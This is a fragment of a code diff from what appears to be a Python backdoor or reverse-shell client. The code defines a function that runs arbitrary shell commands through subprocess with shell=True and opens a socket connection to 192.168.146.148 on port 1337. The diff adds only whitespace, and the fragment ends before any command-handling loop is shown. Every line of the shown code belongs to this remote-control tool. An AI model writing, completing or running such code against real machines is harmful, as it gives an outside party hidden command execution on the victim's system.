@@ -2,8 +2,10 @@
 import socket
 import subprocess
 
+
 def execute_system_command(command):
 	return subprocess.check_output(command, shell=True).decode()
+
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(("192.168.146.148", 1337))
